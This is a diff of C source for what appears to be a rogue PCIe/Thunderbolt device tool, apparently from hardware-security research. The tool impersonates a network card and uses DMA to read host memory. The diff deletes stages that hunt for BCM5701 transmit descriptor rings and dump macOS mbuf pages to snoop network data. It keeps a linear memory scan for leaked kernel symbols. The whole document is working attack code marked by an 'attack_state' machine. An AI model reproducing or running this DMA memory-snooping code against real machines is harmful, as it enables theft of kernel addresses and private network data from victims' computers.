@@ -43,132 +43,6 @@
 #include "pcie-backend.h"
 #include "qemu/bswap.h"
 
-static inline uint16_t
-uint16_min(uint16_t left, uint16_t right)
-{
-	return (left < right) ? left : right;
-}
-
-/*
- * We want to snoop data out of anything interesting. A good candidate is the
- * transmit mbufs -- in particular we hope that we'll be able to some adjacent
- * local socket mbufs.
- *
- * We scan through pages, checking to see if the first 16 * 16 = 256 bytes all
- * match Brett's heuristic for a send buffer descriptor.
- */
-
-/* Each send buffer descriptor is 128 bits = 16 bytes */
-struct bcm5701_send_buffer_descriptor {
-	uint64_t host_address;
-	uint16_t flags;
-	uint16_t length;
-	uint16_t vlan_tag;
-	uint16_t reserved;
-};
-
-enum bcm5701_send_flags {
-	BSF_TCP_UDP_CKSUM = (1 << 0),
-	BSF_IP_CKSUM = (1 << 1),
-	BSF_PACKET_END = (1 << 2),
-	// 3, 4, 5 are reserved
-	BSF_VLAN_TAG = (1 << 6),
-	BSF_COAL_NOW = (1 << 7),
-	BSF_CPU_PRE_DMA = (1 << 8),
-	BSF_CPU_POST_DMA = (1 << 9),
-	// 10, 11, 12, 13, 14, are reserved
-	BSD_DONT_GEN_CRC = (1 << 15)
-};
-
-void
-print_descriptors(struct bcm5701_send_buffer_descriptor *descriptor,
-	uint64_t count)
-{
-	for (uint64_t i = 0; i < count; ++i) {
-		printf("host_address: 0x%016lx; flags: 0x%04x; length: 0x%04x;\n\t"
-			"vlan_tag: 0x%04x; reserved: 0x%04x.\n",
-			descriptor[i].host_address, descriptor[i].flags,
-			descriptor[i].length, descriptor[i].vlan_tag,
-			descriptor[i].reserved);
-	}
-}
-
-bool
-any_descriptor_nonzero(struct bcm5701_send_buffer_descriptor *descriptor,
-	uint64_t count)
-{
-	for (uint64_t i = 0; i < count; ++i) {
-		if (descriptor[i].host_address || descriptor[i].flags ||
-			descriptor[i].length || descriptor[i].vlan_tag ||
-			descriptor[i].reserved) {
-			return true;
-		}
-	}
-	return false;
-}
-
-bool
-is_probably_descriptor(const struct bcm5701_send_buffer_descriptor *buffer)
-{
-	return ((buffer->flags &
-		(uint32_mask_enable_bits(5, 3) | uint32_mask_enable_bits(14, 10)))
-		== 0) && buffer->length != 0 && (buffer->reserved == 0) &&
-		(buffer->host_address != 0);
-}
-
-bool
-is_brett_descriptor(const struct bcm5701_send_buffer_descriptor *buffer)
-{
-	return ((buffer->host_address & 0xffffffff) == 0) &&
-		((buffer->host_address & 0xff00000000000000) == 0x0800000000000000) &&
-		(buffer->vlan_tag == 0);
-}
-
-inline static uint64_t
-swap_dwords_in_qword(uint64_t qword)
-{
-	return (qword >> 32) | (qword << 32);
-}
-
-void
-endianess_swap_descriptor(struct bcm5701_send_buffer_descriptor *descriptor)
-{
-	descriptor->host_address = /* It is still unclear to me why this happens. */
-		swap_dwords_in_qword(bswap64(descriptor->host_address));
-	descriptor->flags = bswap16(descriptor->flags);
-	descriptor->length = bswap16(descriptor->length);
-	descriptor->vlan_tag = bswap16(descriptor->vlan_tag);
-	descriptor->reserved = bswap16(descriptor->reserved);
-}
-
-void
-endianess_swap_descriptors(struct bcm5701_send_buffer_descriptor *descriptor,
-	uint64_t count)
-{
-	for (uint64_t i = 0; i < count; ++i) {
-		endianess_swap_descriptor(&(descriptor[i]));
-	}
-}
-
-
-bool
-is_probably_mbuf(const struct mbuf *mbuf)
-{
-	/* We have to be quite lenient to detect free mbufs: these don't have a
-	 * length value set, for example. However, if we're scanning all of
-	 * memory, we can't afford to detect empties as mbufs.
-	 */
-	return ((mbuf->MM_NEXT & 0xFF) == 0) &&
-		/*
-		((mbuf->m_next & 0xffffff0000000000ll) == 0xffffff0000000000ll) &&
-		((mbuf->m_nextpkt & 0xffffff0000000000ll) == 0xffffff0000000000ll) &&
-		((mbuf->m_data & 0xffffff0000000000ll) == 0xffffff0000000000ll) &&
-		*/
-		((mbuf->MM_NEXTPKT & 0xFF) == 0) &&
-		(mbuf->MM_TYPE <= MT_MAX) &&
-		(mbuf->MM_LEN >= 0) && (mbuf->MM_LEN <= 16384); /* &&
-		!(mbuf->m_next == 0 && mbuf->m_nextpkt == 0 && mbuf->m_data == 0); */
-}
 
 static inline uint64_t
 get_page_address(uint64_t address)
@@ -213,16 +87,7 @@ print_page_at_address(uint64_t address, uint32_t devfn)
 
 enum attack_state {
 	AS_UNINITIALISED,
-	AS_PROBING_NIC,
-	/* The above doesn't work from Thunderbolt. The brdge itself seems to drop the
-	 * config requests. XXX: Would be interesting to try on FreeBSD
-	 * internally.
-	 */
-	AS_LOOKING_FOR_LEAKED_SYMBOL,
-	AS_LOOKING_FOR_DESCRIPTOR_RING,
-	AS_FINDING_MBUF,
-	AS_LINEAR_SCAN_FOR_MBUF,
-	AS_READING_MBUF_PAGE
+	AS_LOOKING_FOR_LEAKED_SYMBOL
 };
 
 enum packet_response {
@@ -231,7 +96,6 @@ enum packet_response {
 
 struct packet_response_state {
 	uint32_t devfn;
-	enum attack_state outer_loop;
 	enum attack_state attack_state;
 };
 
@@ -261,16 +125,18 @@ respond_to_packet(struct packet_response_state *state,
 		}
 
 		state->devfn = config_request_dword2->device_id;
+		printf("Set device ID to 0x%x.\n", state->devfn);
 		response = PR_RESPONSE;
 		req_addr = get_config_req_addr(in);
 
 		if (dir == TLPD_READ) {
+			printf("Responding to CFG Read.\n");
 			out->data_length = 4;
 			switch (req_addr) {
 			case 0: /* vendor and device id */
 				out->data[0] = 0x104b8086;
 				if (state->attack_state == AS_UNINITIALISED) {
-					state->attack_state = state->outer_loop;
+					state->attack_state = AS_LOOKING_FOR_LEAKED_SYMBOL;
 				}
 				break;
 			default:
@@ -309,7 +175,6 @@ respond_to_packet(struct packet_response_state *state,
 int
 main(int argc, char *argv[])
 {
-	bool all_mbufs;
 	int i, send_result, read_result;
 	TLPQuadWord tlp_out_header[2];
 	TLPQuadWord tlp_out_data[16];
@@ -320,25 +185,12 @@ main(int argc, char *argv[])
 
 	enum packet_response response;
 	struct packet_response_state packet_response_state;
-	packet_response_state.outer_loop = AS_LOOKING_FOR_LEAKED_SYMBOL;
 	packet_response_state.attack_state = AS_UNINITIALISED;
 	uint64_t read_addr;/* next_read_addr = 0x000000; */
 	/*uint64_t next_read_addr = 0x3b0000000;*/
 	uint64_t next_read_addr = 0x000000;
 
-	/*uint64_t read_addr, next_read_addr = 0x800000;*/
-	/*
-	 * We have found that in practise the tx ring is not located lower
-	 * than this.
-	 */
-	struct bcm5701_send_buffer_descriptor *descriptor;
-	struct bcm5701_send_buffer_descriptor descriptors[16];
 	uint64_t candidate_symbols[32];
-	struct mbuf mbuf;
-	struct mbuf mbuf_page[MBUFS_PER_PAGE];
-
-	uint64_t descriptor_index, host_address, last_page_address;
-	uint64_t mbuf_index, mbuf_page_address;
 
 	int init = pcie_hardware_init(argc, argv, &physmem);
 	if (init) {
@@ -348,16 +200,6 @@ main(int argc, char *argv[])
 
 	drain_pcie_core();
 	puts("PCIe Core Drained. Let's go.");
-
-
-	/* The rule of thumb I wanted whilst writing this was that the card only
-	 * makes one DMA request/response before checking if the card has data for
-	 * it.
-	 *
-	 * However, a lot of what I want to do is iterating through various
-	 * collections of data items. This means that this is a while loop
-	 * consisting of a number of what are essentially unrolled for loops.
-	 */
 
 	while (1) {
 		next_tlp(&raw_tlp_in);
@@ -377,16 +219,8 @@ main(int argc, char *argv[])
 		switch (packet_response_state.attack_state) {
 		case AS_UNINITIALISED:
 			break;
-		case AS_PROBING_NIC:
-			/* This doesn't work from Thunderbolt: we get UR responses coming
-			 * from the bridges' ID.
-			 */
-			create_config_request_header(&raw_tlp_out, TLPD_READ,
-				packet_response_state.devfn, 0, 0xF, bdf_to_uint(4, 0, 0), 0);
-			send_result = send_tlp(&raw_tlp_out);
-			printf("NIC probe result: %d.\n", send_result);
-			break;
 		case AS_LOOKING_FOR_LEAKED_SYMBOL:
+			puts("L!");
 			if ((next_read_addr & 0xFFFFFF) == 0) {
 				printf("0x%lx.\n", next_read_addr);
 				fflush(NULL);
@@ -417,123 +251,6 @@ main(int argc, char *argv[])
 					printf("Address: 0x%lx.\n", candidate_symbols[i]);
 				}
 			}
-			break;
-		case AS_LOOKING_FOR_DESCRIPTOR_RING:
-			read_result = perform_dma_read((uint8_t *)descriptors,
-				256, packet_response_state.devfn, 0, next_read_addr);
-			printf("Trying %lx...\n", next_read_addr);
-			read_addr = next_read_addr;
-			next_read_addr += 4096;
-			if (read_result == -1 || !any_descriptor_nonzero(descriptors, 16)) {
-				continue;
-			}
-			endianess_swap_descriptors(descriptors, 16);
-
-			/*ring_plausible = true;*/
-
-			/*for (i = 0; i < 16; ++i) {*/
-			/*ring_plausible = ring_plausible &&*/
-			/*is_brett_descriptor(&(descriptors[i]));*/
-			/*}*/
-
-			if (!is_probably_descriptor(&(descriptors[0]))) {
-				/*if (!is_brett_descriptor(&(descriptors[0]))) {}*/
-				/*if (!ring_plausible) {}*/
-				continue;
-			}
-			printf("Probably a descriptor at 0x%lx OK.\n", read_addr);
-			print_descriptors(descriptors, 1);
-			packet_response_state.attack_state = AS_FINDING_MBUF;
-			descriptor_index = 0;
-
-			break;
-		case AS_FINDING_MBUF:
-			descriptor = &(descriptors[descriptor_index]);
-			printf("Descriptor target: 0x%lx. (Offset: 0x%lx)\n",
-				descriptor->host_address,
-				descriptor->host_address & 0xFF);
-#if 0
-			if ((descriptor->host_address & 0xFF) >= 0x20) {
-				mbuf_index = 0;
-				mbuf_page_address = descriptor->host_address & ~uint64_mask(12);
-				packet_response_state.attack_state = AS_READING_MBUF_PAGE;
-			}
-#endif
-			if (is_probably_descriptor(descriptor)) {
-				host_address = descriptor->host_address;
-				if ((host_address & uint64_mask(11)) == 0) {
-#if 0
-					/* clusters are 2k aligned. */
-					length = uint16_min(descriptor->length, 512);
-					printf("Reading address 0x%lx.\n", host_address);
-					read_result = perform_dma_read(read_buffer, length,
-						packet_response_state.devfn, 0, host_address);
-					if (read_result == -1) {
-						printf("Read failed. :(\n");
-					} else {
-						crhexdump(read_buffer, length);
-					}
-#endif
-				} else { /* It's an mbuf, so we can look at the whole page. */
-					mbuf_index = 0;
-					mbuf_page_address = host_address & ~uint64_mask(12);
-					packet_response_state.attack_state = AS_READING_MBUF_PAGE;
-				}
-			}
-			descriptor_index++;
-			if (descriptor_index >= 16 &&
-				packet_response_state.attack_state != AS_READING_MBUF_PAGE) {
-				printf("LOOKING FOR DESCRIPTOR RING AGAIN!.\n");
-				packet_response_state.attack_state =
-					AS_LOOKING_FOR_DESCRIPTOR_RING;
-			}
-			break;
-		case AS_LINEAR_SCAN_FOR_MBUF:
-			read_result = perform_dma_read((uint8_t *)(&mbuf), sizeof(mbuf),
-				packet_response_state.devfn, 0, next_read_addr);
-			endianness_swap_mac_mbuf_header(&mbuf);
-			if (is_probably_mbuf(&mbuf)) {
-				last_page_address = mbuf_page_address;
-				mbuf_page_address = next_read_addr & ~uint64_mask(12);
-				if (last_page_address != mbuf_page_address) {
-					packet_response_state.attack_state = AS_READING_MBUF_PAGE;
-				}
-			}
-			next_read_addr += 4096;
-			break;
-		case AS_READING_MBUF_PAGE:
-			read_result = 0;
-			for (i = 0; i < 4096; i += 256) {
-				read_result += perform_dma_read((uint8_t *)(mbuf_page) + i,
-					256, packet_response_state.devfn, 0,
-					mbuf_page_address + i);
-			}
-			if (read_result == -1) {
-				printf("Failed to read mbuf page at 0x%lx.\n",
-					mbuf_page_address);
-				continue;
-			} else {
-				/*all_mbufs = true;*/
-				for (mbuf_index = 0; mbuf_index < MBUFS_PER_PAGE; ++mbuf_index) {
-					if (!is_probably_mbuf(mbuf_page + mbuf_index)) {
-						all_mbufs = false;
-						break;
-					}
-				}
-				if (all_mbufs) {
-					printf("Found mbuf page at: 0x%lx.\n", mbuf_page_address);
-					for (mbuf_index = 0; mbuf_index < MBUFS_PER_PAGE;
-						++mbuf_index) {
-						endianness_swap_mac_mbuf_header(mbuf_page + mbuf_index);
-						if (is_probably_mbuf(mbuf_page + mbuf_index)) {
-							print_macos_mbuf_header(mbuf_page + mbuf_index);
-						}
-					}
-				}
-				/*crhexdump((uint8_t *)mbuf_page, 4096);*/
-			}
-			packet_response_state.attack_state =
-				packet_response_state.outer_loop;
 			break;
 		}
 	}
